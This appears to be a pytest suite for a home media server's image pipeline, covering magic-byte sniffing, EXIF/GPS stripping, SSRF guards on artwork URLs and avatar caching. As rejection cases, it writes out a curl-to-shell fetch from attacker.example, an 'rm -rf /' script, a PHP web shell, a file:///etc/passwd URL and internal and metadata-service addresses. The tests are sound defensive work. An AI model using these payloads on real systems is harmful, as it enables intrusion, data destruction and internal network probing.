"""Images that arrive from outside: avatars, chosen artwork, and the guards around both.

Three properties are defended here, and each of them is the kind that fails silently.

**The magic bytes decide.** A `.png` that is really a shell script arrives declaring
`image/png` and named `avatar.png`; the only part of an upload the uploader cannot assert is
its first eight bytes.

**The re-encode is real.** `test_avatar_upload_strips_exif` builds a JPEG carrying an actual
Exif APP1 segment with a GPS IFD in it — the same block a phone writes, holding the
coordinates of wherever the photo was taken — uploads it, and reads the *stored* bytes back
looking for it. Household members are about to hand each other these files. A test that only
checked the output was a valid image would pass on a pipeline that copied the input through.

**An admin-supplied URL is not a place to send the server.** This box sits on the household
network beside the NAS and the router's admin page, so `test_artwork_url_*` walks the address
ranges that matter, including the case that a naive implementation always misses: a perfectly
public hostname whose *redirect* points at 127.0.0.1.

No test here touches the network or real DNS. `fake_dns` is autouse, and every HTTP client the
code under test would build is replaced by an `httpx.MockTransport`.
"""

from __future__ import annotations

import asyncio
import struct
import subprocess
from collections.abc import AsyncIterator, Callable
from pathlib import Path
from typing import Any

import httpx
import pytest
from httpx import ASGITransport, AsyncClient
from sqlalchemy.ext.asyncio import AsyncSession

from app.models import Series, User
from app.services import images as images_service

pytestmark = pytest.mark.anyio

#: A string that has no business surviving a re-encode. Written into the Exif ImageDescription
#: so that finding it in the output means the metadata block came through.
EXIF_CANARY = b"DRAMATARR-EXIF-CANARY"

#: Addresses the guard has to refuse, one per range that actually shows up in an attack:
#: loopback by name and by literal, RFC 1918, and the link-local address every cloud and many
#: NAS boxes answer on.
PRIVATE_URLS = (
    "http://localhost/poster.png",
    "http://127.0.0.1/poster.png",
    "http://127.0.0.1:8000/poster.png",
    "http://10.1.2.3/poster.png",
    "http://169.254.169.254/latest/meta-data/poster.png",
    "http://192.168.1.1/poster.png",
    "http://[::1]/poster.png",
    "http://internal.example/poster.png",
)

#: Resolution used by every test in this file. Real `getaddrinfo` never runs, so the suite has
#: no opinion about the machine's DNS and `internal.example` can be a private host on purpose.
FAKE_DNS: dict[str, list[str]] = {
    "localhost": ["127.0.0.1", "::1"],
    "internal.example": ["10.1.2.3"],
    "images.example": ["93.184.216.34"],
    "redirector.example": ["93.184.216.34"],
    "www.googleapis.com": ["142.250.72.202"],
}


# --- Building real image bytes ----------------------------------------------------------------


def _ffmpeg(args: list[str]) -> subprocess.CompletedProcess[bytes]:
    return subprocess.run(
        ["ffmpeg", "-nostdin", "-hide_banner", "-loglevel", "error", "-y", *args],
        capture_output=True,
        check=False,
    )


def make_image(tmp_path: Path, name: str, width: int, height: int) -> bytes:
    """A genuine PNG/JPEG of the requested size, produced by the ffmpeg the app itself uses."""
    target = tmp_path / name
    result = _ffmpeg(
        [
            "-f",
            "lavfi",
            "-i",
            f"testsrc=size={width}x{height}",
            "-frames:v",
            "1",
            str(target),
        ]
    )
    assert result.returncode == 0, result.stderr.decode()
    return target.read_bytes()


def exif_app1() -> bytes:
    """A structurally valid Exif APP1 segment: ImageDescription plus a GPS IFD.

    Hand-built rather than lifted from a photo so the test owns every byte it later looks for.
    Offsets inside a TIFF block are measured from the start of that block, which is why they
    are computed here rather than written as constants: getting one wrong would produce a
    segment ffmpeg quietly ignores, and the test would then prove nothing.
    """
    description = EXIF_CANARY + b"\x00"

    ifd0_offset = 8  # immediately after the TIFF header
    ifd_size = 2 + 2 * 12 + 4  # entry count + two entries + next-IFD pointer
    description_offset = ifd0_offset + ifd_size
    gps_offset = description_offset + len(description)
    padding = b""
    if gps_offset % 2:  # TIFF offsets are word-aligned
        padding = b"\x00"
        gps_offset += 1
    rationals_offset = gps_offset + ifd_size

    def entry(tag: int, kind: int, count: int, value: bytes) -> bytes:
        return struct.pack("<HHI", tag, kind, count) + value

    ifd0 = struct.pack("<H", 2)
    ifd0 += entry(0x010E, 2, len(description), struct.pack("<I", description_offset))
    ifd0 += entry(0x8825, 4, 1, struct.pack("<I", gps_offset))  # GPS IFD pointer
    ifd0 += struct.pack("<I", 0)

    gps = struct.pack("<H", 2)
    gps += entry(0x0001, 2, 2, b"N\x00\x00\x00")  # GPSLatitudeRef, inline
    gps += entry(0x0002, 5, 3, struct.pack("<I", rationals_offset))  # GPSLatitude
    gps += struct.pack("<I", 0)

    # 52° 22' 33.00" — a real-looking fix, and 24 bytes that are easy to search for.
    rationals = struct.pack("<IIIIII", 52, 1, 22, 1, 3300, 100)

    tiff = b"II" + struct.pack("<HI", 42, ifd0_offset)
    tiff += ifd0 + description + padding + gps + rationals
    payload = b"Exif\x00\x00" + tiff
    return b"\xff\xe1" + struct.pack(">H", len(payload) + 2) + payload


def jpeg_with_exif(tmp_path: Path) -> tuple[bytes, bytes]:
    """A JPEG whose Exif block really is in it. Returns (bytes, the GPS rationals to hunt for)."""
    base = make_image(tmp_path, "exif-source.jpg", 900, 600)
    assert base[:2] == b"\xff\xd8"
    segment = exif_app1()
    photo = base[:2] + segment + base[2:]

    rationals = struct.pack("<IIIIII", 52, 1, 22, 1, 3300, 100)
    # The premise of the test, asserted rather than assumed.
    assert b"Exif\x00\x00" in photo
    assert EXIF_CANARY in photo
    assert rationals in photo
    return photo, rationals


def webp_header() -> bytes:
    """Just enough of a RIFF/WEBP container to exercise the sniffer.

    Not decodable, and deliberately so: this is the one case where sniffing and decoding must
    be tested apart, because the point of `sniff_image_format` is that it runs *before* and
    independently of ffmpeg.
    """
    return b"RIFF" + struct.pack("<I", 24) + b"WEBPVP8 " + b"\x00" * 16


# --- Fixtures ---------------------------------------------------------------------------------


@pytest.fixture(autouse=True)
def fake_dns(monkeypatch: pytest.MonkeyPatch) -> None:
    """No test in this file resolves a real name."""

    def resolve(host: str, port: int) -> list[str]:
        try:
            return FAKE_DNS[host]
        except KeyError:
            raise OSError(f"no such host: {host}") from None

    monkeypatch.setattr(images_service, "_resolve_host", resolve)


def mock_client(handler: Callable[[httpx.Request], httpx.Response], **kwargs: Any) -> AsyncClient:
    return AsyncClient(transport=httpx.MockTransport(handler), **kwargs)


@pytest.fixture
def serve_remote(monkeypatch: pytest.MonkeyPatch) -> Callable[..., list[httpx.Request]]:
    """Install a fake origin for `fetch_remote_image`, and record what it was asked for."""

    def install(handler: Callable[[httpx.Request], httpx.Response]) -> list[httpx.Request]:
        seen: list[httpx.Request] = []

        def wrapped(request: httpx.Request) -> httpx.Response:
            seen.append(request)
            return handler(request)

        client = mock_client(wrapped, follow_redirects=False)

        async def guarded() -> AsyncClient:
            return client

        monkeypatch.setattr(images_service, "_guarded_client", guarded)
        return seen

    return install


def _client(db: AsyncSession, user: User, *, admin: bool) -> AsyncClient:
    """The real app over ASGI on the test's own session.

    A viewer gets `get_current_user` overridden and nothing else, so `require_admin` runs for
    real and any 403 under test is the one production would raise.
    """
    from app.api.deps import get_current_user, require_admin
    from app.db import get_session
    from app.main import app

    async def _session() -> AsyncIterator[AsyncSession]:
        yield db

    app.dependency_overrides[get_session] = _session
    app.dependency_overrides[get_current_user] = lambda: user
    if admin:
        app.dependency_overrides[require_admin] = lambda: user
    return AsyncClient(transport=ASGITransport(app=app), base_url="http://test")


@pytest.fixture
async def client(db: AsyncSession, admin_user: User) -> AsyncIterator[AsyncClient]:
    from app.main import app

    try:
        async with _client(db, admin_user, admin=True) as http:
            yield http
    finally:
        app.dependency_overrides.clear()


@pytest.fixture
async def viewer_client(db: AsyncSession, viewer_user: User) -> AsyncIterator[AsyncClient]:
    from app.main import app

    try:
        async with _client(db, viewer_user, admin=False) as http:
            yield http
    finally:
        app.dependency_overrides.clear()


@pytest.fixture
def avatars_dir(tmp_env: Path) -> Path:
    from app.config import get_settings

    return get_settings().data_dir / "avatars"


@pytest.fixture
def images_dir(tmp_env: Path) -> Path:
    from app.config import get_settings

    return get_settings().images_dir


def error_code(response: httpx.Response) -> str:
    return str(response.json()["error"]["code"])


def avatar_files(avatars_dir: Path, user_id: str) -> list[Path]:
    """Every avatar file stored for a member. More than one would mean a replacement leaked."""
    return sorted(avatars_dir.glob(f"{user_id}.*"))


def stored_avatar(avatars_dir: Path, user_id: str) -> Path:
    matches = avatar_files(avatars_dir, user_id)
    assert len(matches) == 1, f"expected exactly one avatar file, found {matches}"
    return matches[0]


def artwork_files(images_dir: Path, series_id: str, kind: str) -> list[Path]:
    return sorted((images_dir / series_id).glob(f"{kind}.*"))


def dimensions(path: Path) -> tuple[int, int]:
    result = subprocess.run(
        [
            "ffprobe",
            "-v",
            "error",
            "-select_streams",
            "v:0",
            "-show_entries",
            "stream=width,height",
            "-of",
            "csv=p=0:s=x",
            str(path),
        ],
        capture_output=True,
        text=True,
        check=False,
    )
    assert result.returncode == 0, result.stderr
    width, _, height = result.stdout.strip().partition("x")
    return int(width), int(height)


# --- Magic bytes ------------------------------------------------------------------------------


def test_sniff_reads_signatures_not_names(tmp_path: Path) -> None:
    from app.services.images import sniff_image_format

    assert sniff_image_format(make_image(tmp_path, "a.png", 32, 32)) == "png"
    assert sniff_image_format(make_image(tmp_path, "a.jpg", 32, 32)) == "jpeg"
    assert sniff_image_format(webp_header()) == "webp"

    assert sniff_image_format(b"#!/bin/sh\necho pwned\n" + b"x" * 64) is None
    assert sniff_image_format(b"GIF89a" + b"\x00" * 32) is None
    assert sniff_image_format(b"%PDF-1.7\n" + b"\x00" * 32) is None
    assert sniff_image_format(b"") is None
    # A RIFF container that is not WebP — a WAV file starts exactly like this.
    assert sniff_image_format(b"RIFF" + b"\x00" * 4 + b"WAVEfmt ") is None


async def test_avatar_rejects_a_script_wearing_a_png_name(
    client: AsyncClient, admin_user: User, avatars_dir: Path
) -> None:
    """The declared type and the filename both say PNG. Only the bytes are asked."""
    payload = b"#!/bin/sh\ncurl http://attacker.example/ | sh\n"
    response = await client.post(
        "/api/me/avatar",
        files={"file": ("innocent.png", payload, "image/png")},
    )
    assert response.status_code == 400, response.text
    assert error_code(response) == "AVATAR_INVALID"
    assert not avatar_files(avatars_dir, admin_user.id)


async def test_avatar_rejects_a_png_header_with_rubbish_behind_it(
    client: AsyncClient, admin_user: User, avatars_dir: Path
) -> None:
    """Past the sniffer, stopped by the decoder — the second half of the same guard."""
    payload = b"\x89PNG\r\n\x1a\n" + b"not really a PNG at all" * 40
    response = await client.post(
        "/api/me/avatar", files={"file": ("real.png", payload, "image/png")}
    )
    assert response.status_code == 400, response.text
    assert error_code(response) == "AVATAR_INVALID"
    assert not avatar_files(avatars_dir, admin_user.id)


async def test_avatar_webp_reaches_the_decoder(client: AsyncClient) -> None:
    """The WebP branch is wired to a demuxer and decoder that exist.

    A header-only WebP is a genuine RIFF/WEBP container, so it gets past the sniffer and is
    handed to ffmpeg as `-f webp_pipe -c:v webp`. Asserting the failure is the *decode* one
    rather than the sniffer's is what proves that pairing is real: a typo in either name would
    fail here too, but with ffmpeg complaining about an unknown format instead.
    """
    response = await client.post(
        "/api/me/avatar", files={"file": ("x.webp", webp_header(), "image/webp")}
    )
    assert response.status_code == 400, response.text
    assert error_code(response) == "AVATAR_INVALID"
    assert response.json()["error"]["message"].startswith("That image could not be decoded")


def test_encoder_listing_is_parsed() -> None:
    """The one decision this suite cannot exercise locally.

    Homebrew's ffmpeg ships without `libwebp`, so on a developer's Mac the fallback encoder is
    what every test above actually ran through. The api image is Debian, whose ffmpeg *does*
    have it — so the format the household's files are really stored in is decided by this
    parser reading that listing, and this is the only place it can be checked.
    """
    from app.services.images import _parse_encoders

    listing = """Encoders:
 V..... = Video
 A..... = Audio
 S..... = Subtitle
 .F.... = Frame-level multithreading
 ------
 V....D libwebp_anim         libwebp WebP image (codec webp)
 V....D libwebp              libwebp WebP image (codec webp)
 V..... mjpeg                MJPEG (Motion JPEG)
 V..... png                  PNG (Portable Network Graphics) image
 A....D aac                  AAC (Advanced Audio Coding)
"""
    parsed = _parse_encoders(listing)
    assert parsed == {"libwebp_anim", "libwebp", "mjpeg", "png", "aac"}
    assert "=" not in parsed, "the legend above the list is not an encoder"


async def test_avatar_rejects_oversize_upload(
    client: AsyncClient, admin_user: User, avatars_dir: Path
) -> None:
    from app.services.images import MAX_AVATAR_BYTES

    payload = b"\x89PNG\r\n\x1a\n" + b"\x00" * MAX_AVATAR_BYTES
    response = await client.post(
        "/api/me/avatar", files={"file": ("huge.png", payload, "image/png")}
    )
    assert response.status_code == 413, response.text
    assert error_code(response) == "AVATAR_TOO_LARGE"
    assert response.json()["error"]["details"]["maxBytes"] == MAX_AVATAR_BYTES
    assert not avatar_files(avatars_dir, admin_user.id)


# --- The re-encode ----------------------------------------------------------------------------


async def test_avatar_upload_strips_exif(
    client: AsyncClient, admin_user: User, avatars_dir: Path, tmp_path: Path
) -> None:
    """The GPS coordinates in the uploaded photo must not reach the stored file.

    This is the test the whole re-encode exists for. It reads the bytes on disk, not the
    response, because what leaks is the file every other household member can fetch.
    """
    photo, rationals = jpeg_with_exif(tmp_path)

    response = await client.post(
        "/api/me/avatar", files={"file": ("holiday.jpg", photo, "image/jpeg")}
    )
    assert response.status_code == 200, response.text

    stored = stored_avatar(avatars_dir, admin_user.id).read_bytes()
    assert b"Exif\x00\x00" not in stored
    assert EXIF_CANARY not in stored
    assert rationals not in stored
    # And it is genuinely a different encoding of the picture, not the input trimmed.
    assert stored != photo


async def test_avatar_is_squared_and_bounded(
    client: AsyncClient, admin_user: User, avatars_dir: Path, tmp_path: Path
) -> None:
    from app.services.images import AVATAR_EDGE

    wide = make_image(tmp_path, "wide.png", 1600, 900)
    response = await client.post("/api/me/avatar", files={"file": ("wide.png", wide, "image/png")})
    assert response.status_code == 200, response.text

    width, height = dimensions(stored_avatar(avatars_dir, admin_user.id))
    assert width == height
    assert width <= AVATAR_EDGE


async def test_avatar_small_image_is_not_upscaled(
    client: AsyncClient, admin_user: User, avatars_dir: Path, tmp_path: Path
) -> None:
    """`min(EDGE, iw)` rather than a flat resize: a 120 px photo stays 120 px, not blurred up."""
    small = make_image(tmp_path, "small.png", 200, 120)
    response = await client.post(
        "/api/me/avatar", files={"file": ("small.png", small, "image/png")}
    )
    assert response.status_code == 200, response.text
    assert dimensions(stored_avatar(avatars_dir, admin_user.id)) == (120, 120)


# --- Replace, delete, and what the profile reports ---------------------------------------------


async def test_avatar_replace_and_delete(
    client: AsyncClient, admin_user: User, avatars_dir: Path, tmp_path: Path
) -> None:
    before = await client.get("/api/me")
    assert before.status_code == 200
    assert before.json()["avatarUrl"] is None, "no avatar means initials, not a placeholder URL"

    first = await client.post(
        "/api/me/avatar",
        files={"file": ("one.png", make_image(tmp_path, "one.png", 400, 400), "image/png")},
    )
    assert first.status_code == 200, first.text
    first_url = first.json()["avatarUrl"]
    assert first_url is not None
    assert first_url.startswith(f"/api/stream/avatars/{admin_user.id}?v=")
    original = stored_avatar(avatars_dir, admin_user.id).read_bytes()

    second = await client.post(
        "/api/me/avatar",
        files={"file": ("two.jpg", make_image(tmp_path, "two.jpg", 640, 480), "image/jpeg")},
    )
    assert second.status_code == 200, second.text
    second_url = second.json()["avatarUrl"]

    # Exactly one file survives the replacement — `stored_avatar` asserts that — and it is a
    # different picture reachable at a different URL, so no cache can hold the old one.
    replaced = stored_avatar(avatars_dir, admin_user.id).read_bytes()
    assert replaced != original
    assert second_url != first_url

    # `GET /api/me` agrees with the upload response; the URL is derived, not remembered.
    assert (await client.get("/api/me")).json()["avatarUrl"] == second_url

    removed = await client.delete("/api/me/avatar")
    assert removed.status_code == 200, removed.text
    assert removed.json()["avatarUrl"] is None
    assert not avatar_files(avatars_dir, admin_user.id)

    # Deleting again is not an error: the caller asked to end up with no photo, and they have.
    assert (await client.delete("/api/me/avatar")).status_code == 200


async def test_avatar_url_reaches_the_stream_route(
    client: AsyncClient, admin_user: User, tmp_path: Path
) -> None:
    upload = await client.post(
        "/api/me/avatar",
        files={"file": ("me.png", make_image(tmp_path, "me.png", 300, 300), "image/png")},
    )
    assert upload.status_code == 200, upload.text

    served = await client.get(upload.json()["avatarUrl"])
    assert served.status_code == 200
    assert served.headers["content-type"].startswith("image/")
    assert served.content


async def test_avatar_etag_changes_when_the_file_changes(
    client: AsyncClient, admin_user: User, tmp_path: Path
) -> None:
    """A replaced avatar must not be served from a cache — via the ETag or via the URL."""
    first = await client.post(
        "/api/me/avatar",
        files={"file": ("a.png", make_image(tmp_path, "a.png", 400, 400), "image/png")},
    )
    assert first.status_code == 200, first.text
    url = f"/api/stream/avatars/{admin_user.id}"

    original = await client.get(url)
    assert original.status_code == 200
    first_etag = original.headers["etag"]
    assert first_etag

    # Unchanged file, client holds the tag → 304 and no body.
    revalidated = await client.get(url, headers={"if-none-match": first_etag})
    assert revalidated.status_code == 304
    assert not revalidated.content

    # A visibly different picture, so both halves of the size+mtime tag move.
    await asyncio.sleep(0.01)
    second = await client.post(
        "/api/me/avatar",
        files={"file": ("b.jpg", make_image(tmp_path, "b.jpg", 800, 600), "image/jpeg")},
    )
    assert second.status_code == 200, second.text

    stale = await client.get(url, headers={"if-none-match": first_etag})
    assert stale.status_code == 200, "a stale ETag must not be honoured after a replacement"
    assert stale.headers["etag"] != first_etag
    assert stale.content


async def test_avatar_is_visible_to_other_household_members(
    db: AsyncSession, admin_user: User, viewer_user: User, tmp_path: Path
) -> None:
    """Members see each other. A picture only its owner could load is a picture nobody sees.

    Two identities on one client rather than two client fixtures: the overrides live on the
    module-level `app`, so a second fixture would silently re-point the first one's user too.
    """
    from app.api.deps import get_current_user
    from app.main import app

    try:
        async with _client(db, admin_user, admin=True) as http:
            upload = await http.post(
                "/api/me/avatar",
                files={
                    "file": ("admin.png", make_image(tmp_path, "admin.png", 256, 256), "image/png")
                },
            )
            assert upload.status_code == 200, upload.text

            app.dependency_overrides[get_current_user] = lambda: viewer_user

            seen = await http.get(f"/api/stream/avatars/{admin_user.id}")
            assert seen.status_code == 200
            assert seen.content

            # A viewer uploading is the same endpoint — this is not an admin feature — and it
            # lands on their own account, because the route never takes a user id.
            own = await http.post(
                "/api/me/avatar",
                files={"file": ("v.png", make_image(tmp_path, "v.png", 256, 256), "image/png")},
            )
            assert own.status_code == 200, own.text
            assert own.json()["avatarUrl"].startswith(f"/api/stream/avatars/{viewer_user.id}?v=")
    finally:
        app.dependency_overrides.clear()


async def test_avatar_missing_is_a_plain_404(client: AsyncClient, admin_user: User) -> None:
    """Also true for a user id that does not exist — so this cannot enumerate accounts."""
    for user_id in (admin_user.id, "0" * 32):
        response = await client.get(f"/api/stream/avatars/{user_id}")
        assert response.status_code == 404
        assert error_code(response) == "AVATAR_NOT_FOUND"


async def test_admin_user_list_carries_the_same_avatar_url(
    client: AsyncClient, admin_user: User, viewer_user: User, tmp_path: Path
) -> None:
    """The member list must draw the photo, not initials, for a member who has one.

    `UserOut` derives `avatarUrl` the same way `AuthUser` and `MeOut` do — from the stored
    file, since there is no column — and this is the only surface where the three could
    disagree: it is built by hand in `_user_out` rather than by `model_validate`, so a
    validator that ran for the other two and not for this one would show up nowhere else.
    """
    upload = await client.post(
        "/api/me/avatar",
        files={"file": ("me.png", make_image(tmp_path, "me.png", 300, 300), "image/png")},
    )
    assert upload.status_code == 200, upload.text
    mine = upload.json()["avatarUrl"]
    assert mine

    listing = await client.get("/api/admin/users")
    assert listing.status_code == 200, listing.text
    rows = {row["id"]: row for row in listing.json()}

    assert rows[admin_user.id]["avatarUrl"] == mine
    # A member who never uploaded one stays null, which is what makes the UI draw initials.
    assert rows[viewer_user.id]["avatarUrl"] is None


# --- SSRF ---------------------------------------------------------------------------------------


@pytest.fixture
async def series(db: AsyncSession) -> Series:
    row = Series(
        title="Ruta de Cristal",
        slug="ruta-de-cristal",
        sort_title="ruta de cristal",
        library_path="Ruta de Cristal (2024)",
        year=2024,
    )
    db.add(row)
    await db.commit()
    return row


@pytest.mark.parametrize("url", PRIVATE_URLS)
async def test_artwork_url_refuses_private_targets(
    client: AsyncClient,
    series: Series,
    serve_remote: Callable[..., list[httpx.Request]],
    url: str,
) -> None:
    """Nothing inside this network is fetchable, by name or by literal.

    `seen` staying empty is half the assertion: the refusal happens *before* a connection, so
    the endpoint cannot be used to probe which internal ports answer by timing the failure.
    """

    def handler(request: httpx.Request) -> httpx.Response:  # pragma: no cover - must not run
        raise AssertionError(f"the guard let a request through to {request.url}")

    seen = serve_remote(handler)
    response = await client.post(
        f"/api/library/series/{series.id}/artwork", json={"kind": "poster", "url": url}
    )
    assert response.status_code == 400, response.text
    assert error_code(response) == "ARTWORK_URL_BLOCKED"
    assert seen == []


@pytest.mark.parametrize(
    "url",
    [
        "file:///etc/passwd",
        "ftp://images.example/poster.png",
        "gopher://images.example/poster.png",
        "data:image/png;base64,iVBORw0KGgo=",
        "//images.example/poster.png",
    ],
)
async def test_artwork_url_refuses_non_http_schemes(
    client: AsyncClient, series: Series, url: str
) -> None:
    response = await client.post(
        f"/api/library/series/{series.id}/artwork", json={"kind": "poster", "url": url}
    )
    assert response.status_code == 400, response.text
    assert error_code(response) == "ARTWORK_URL_INVALID"


async def test_artwork_url_refuses_a_redirect_into_the_network(
    client: AsyncClient, series: Series, serve_remote: Callable[..., list[httpx.Request]]
) -> None:
    """The case a first-hop-only check always misses.

    `redirector.example` resolves to a public address and passes the guard cleanly. Its answer
    is a 302 to loopback — which is why redirects are followed by hand here instead of by
    httpx, and why every hop is re-checked rather than only the URL the admin typed.
    """

    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.host == "redirector.example":
            return httpx.Response(
                302, headers={"location": "http://127.0.0.1:9000/admin/poster.png"}
            )
        raise AssertionError(f"followed the redirect to {request.url}")

    seen = serve_remote(handler)
    response = await client.post(
        f"/api/library/series/{series.id}/artwork",
        json={"kind": "poster", "url": "http://redirector.example/poster.png"},
    )
    assert response.status_code == 400, response.text
    assert error_code(response) == "ARTWORK_URL_BLOCKED"
    # The first hop was fetched; the second was refused before it was requested.
    assert [str(request.url) for request in seen] == ["http://redirector.example/poster.png"]


async def test_artwork_url_refuses_a_redirect_chain_to_a_private_name(
    client: AsyncClient, series: Series, serve_remote: Callable[..., list[httpx.Request]]
) -> None:
    """Same guard one hop later, and against a *name* that resolves privately rather than a
    literal — the version that gets past a check written as a regex over the URL."""

    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.host == "images.example":
            return httpx.Response(301, headers={"location": "http://redirector.example/p.png"})
        if request.url.host == "redirector.example":
            return httpx.Response(302, headers={"location": "http://internal.example/p.png"})
        raise AssertionError(f"followed the chain to {request.url}")

    seen = serve_remote(handler)
    response = await client.post(
        f"/api/library/series/{series.id}/artwork",
        json={"kind": "poster", "url": "http://images.example/p.png"},
    )
    assert response.status_code == 400, response.text
    assert error_code(response) == "ARTWORK_URL_BLOCKED"
    assert len(seen) == 2


async def test_artwork_url_stops_a_redirect_loop(
    client: AsyncClient, series: Series, serve_remote: Callable[..., list[httpx.Request]]
) -> None:
    def handler(request: httpx.Request) -> httpx.Response:
        return httpx.Response(302, headers={"location": "http://images.example/again.png"})

    seen = serve_remote(handler)
    response = await client.post(
        f"/api/library/series/{series.id}/artwork",
        json={"kind": "poster", "url": "http://images.example/p.png"},
    )
    assert response.status_code == 502, response.text
    assert error_code(response) == "ARTWORK_FETCH_FAILED"
    assert len(seen) == images_service.MAX_REDIRECTS + 1


async def test_public_url_guard_accepts_a_public_host() -> None:
    """The guard is a filter, not a ban — the ordinary case has to pass."""
    await images_service.assert_public_url("https://images.example/poster.png")


# --- Choosing artwork ---------------------------------------------------------------------------


async def test_artwork_selection_stores_and_locks_metadata(
    client: AsyncClient,
    db: AsyncSession,
    series: Series,
    images_dir: Path,
    serve_remote: Callable[..., list[httpx.Request]],
    tmp_path: Path,
) -> None:
    """A chosen poster becomes the series' poster, and the choice survives the next refresh.

    `artwork_locked` is the load-bearing assertion, and it is deliberately **not**
    `metadata_locked`. Choosing a picture used to set that one, so uploading a poster opted the
    series out of every future metadata update — a decision nobody made by picking an image.
    Without a lock of its own the next refresh would put
    the automatic pick back, and an admin who has to re-choose their poster every night stops
    choosing.
    """
    assert series.artwork_locked is False
    poster = make_image(tmp_path, "poster.png", 1000, 1500)

    def handler(request: httpx.Request) -> httpx.Response:
        return httpx.Response(200, content=poster, headers={"content-type": "image/png"})

    serve_remote(handler)
    response = await client.post(
        f"/api/library/series/{series.id}/artwork",
        json={"kind": "poster", "url": "http://images.example/poster.png"},
    )
    assert response.status_code == 200, response.text
    body = response.json()
    assert body["kind"] == "poster"
    assert body["artworkLocked"] is True
    assert body["storedPath"].startswith(f"images/{series.id}/poster.")
    assert body["url"] == f"/api/stream/images/{series.id}/{Path(body['storedPath']).name}"

    await db.refresh(series)
    assert series.artwork_locked is True
    # And the *other* flag stays down: "elegir póster no debería bloquear la actualización".
    assert series.metadata_locked is False
    assert series.poster_path == body["storedPath"]

    on_disk = artwork_files(images_dir, series.id, "poster")
    assert len(on_disk) == 1
    # Re-encoded, not passed through: the stored bytes differ from what the origin served.
    assert on_disk[0].read_bytes() != poster

    # And it is reachable through the ordinary image route.
    served = await client.get(body["url"])
    assert served.status_code == 200
    assert served.content == on_disk[0].read_bytes()


async def test_artwork_is_bounded_on_the_long_edge(
    client: AsyncClient,
    series: Series,
    images_dir: Path,
    serve_remote: Callable[..., list[httpx.Request]],
    tmp_path: Path,
) -> None:
    from app.services.images import ARTWORK_EDGE

    huge = make_image(tmp_path, "huge.png", 3200, 1800)
    serve_remote(lambda request: httpx.Response(200, content=huge))

    response = await client.post(
        f"/api/library/series/{series.id}/artwork",
        json={"kind": "backdrop", "url": "http://images.example/huge.png"},
    )
    assert response.status_code == 200, response.text

    stored = artwork_files(images_dir, series.id, "backdrop")[0]
    width, height = dimensions(stored)
    assert max(width, height) == ARTWORK_EDGE
    # Aspect ratio preserved — a squashed backdrop is worse than a small one.
    assert abs((width / height) - (3200 / 1800)) < 0.02


async def test_artwork_rejects_a_script_from_a_url(
    client: AsyncClient, series: Series, serve_remote: Callable[..., list[httpx.Request]]
) -> None:
    """A public host is allowed to be asked; it is not allowed to decide what it sends back."""
    serve_remote(
        lambda request: httpx.Response(
            200, content=b"#!/bin/sh\nrm -rf /\n", headers={"content-type": "image/png"}
        )
    )
    response = await client.post(
        f"/api/library/series/{series.id}/artwork",
        json={"kind": "poster", "url": "http://images.example/poster.png"},
    )
    assert response.status_code == 400, response.text
    assert error_code(response) == "ARTWORK_INVALID"


async def test_artwork_rejects_an_oversize_download(
    client: AsyncClient, series: Series, serve_remote: Callable[..., list[httpx.Request]]
) -> None:
    from app.services.images import MAX_ARTWORK_BYTES

    body = b"\x89PNG\r\n\x1a\n" + b"\x00" * MAX_ARTWORK_BYTES
    serve_remote(lambda request: httpx.Response(200, content=body))

    response = await client.post(
        f"/api/library/series/{series.id}/artwork",
        json={"kind": "poster", "url": "http://images.example/big.png"},
    )
    assert response.status_code == 413, response.text
    assert error_code(response) == "ARTWORK_TOO_LARGE"


async def test_artwork_upload_takes_the_same_pipeline(
    client: AsyncClient,
    db: AsyncSession,
    series: Series,
    images_dir: Path,
    tmp_path: Path,
) -> None:
    """A local file gets the same magic-byte check, re-encode and lock as a URL."""
    photo, rationals = jpeg_with_exif(tmp_path)

    response = await client.post(
        f"/api/library/series/{series.id}/artwork/upload?kind=poster",
        files={"file": ("scan.jpg", photo, "image/jpeg")},
    )
    assert response.status_code == 200, response.text
    assert response.json()["artworkLocked"] is True

    stored = artwork_files(images_dir, series.id, "poster")[0].read_bytes()
    assert b"Exif\x00\x00" not in stored
    assert rationals not in stored

    await db.refresh(series)
    assert series.artwork_locked is True

    rejected = await client.post(
        f"/api/library/series/{series.id}/artwork/upload?kind=poster",
        files={"file": ("evil.jpg", b"<?php system($_GET['c']); ?>", "image/jpeg")},
    )
    assert rejected.status_code == 400
    assert error_code(rejected) == "ARTWORK_INVALID"


async def test_artwork_upload_rejects_oversize(client: AsyncClient, series: Series) -> None:
    from app.services.images import MAX_ARTWORK_BYTES

    payload = b"\x89PNG\r\n\x1a\n" + b"\x00" * MAX_ARTWORK_BYTES
    response = await client.post(
        f"/api/library/series/{series.id}/artwork/upload?kind=backdrop",
        files={"file": ("huge.png", payload, "image/png")},
    )
    assert response.status_code == 413, response.text
    assert error_code(response) == "ARTWORK_TOO_LARGE"


async def test_artwork_routes_are_admin_only(
    viewer_client: AsyncClient, series: Series
) -> None:
    chosen = await viewer_client.post(
        f"/api/library/series/{series.id}/artwork",
        json={"kind": "poster", "url": "http://images.example/p.png"},
    )
    assert chosen.status_code == 403



# --- What the browser is actually handed ---------------------------------------------------------


def test_a_path_this_app_serves_is_passed_through(tmp_env) -> None:
    """The bug that blanked every poster in the library at once.

    `cache_dramadex_poster` and `cache_request_poster` both return an address this application
    serves — `/api/stream/images/requests/<name>`. It starts with a slash, and so does a legacy
    TMDB source path, so it fell into the TMDB branch and came back as
    `https://image.tmdb.org/t/p/w500/api/stream/images/requests/…`, which has never existed.

    One series carried that shape for weeks and nobody noticed. The day a refresh moved *every*
    series onto DramaDex artwork, the whole catalogue went blank in one step.
    """
    from app.services.images import request_poster_url
    from app.services.library import image_url

    served = request_poster_url("63cdacea1f3ddfe566f851d51adecd1a-8e1598742ecd.webp")
    assert image_url(served, "w500") == served


def test_a_cache_relative_path_is_served_locally(tmp_env) -> None:
    from app.services.library import image_url

    url = image_url("images/abc123/poster.webp", "w500")
    assert url is not None
    assert url.startswith("/api/stream/images/")
    assert "themoviedb" not in url and "tmdb" not in url


def test_a_legacy_tmdb_source_path_still_points_at_the_cdn(tmp_env) -> None:
    """Artwork written while TMDB was a source must not go blank because it was removed."""
    from app.services.library import image_url

    assert image_url("/abc.jpg", "w500") == "https://image.tmdb.org/t/p/w500/abc.jpg"


def test_an_arbitrary_absolute_url_is_refused(tmp_env) -> None:
    """The column is data. An arbitrary host in an `<img src>` is a beacon on every member."""
    from app.services.library import image_url

    assert image_url("https://tracker.example/pixel.png", "w500") is None


def test_nothing_in_nothing_out(tmp_env) -> None:
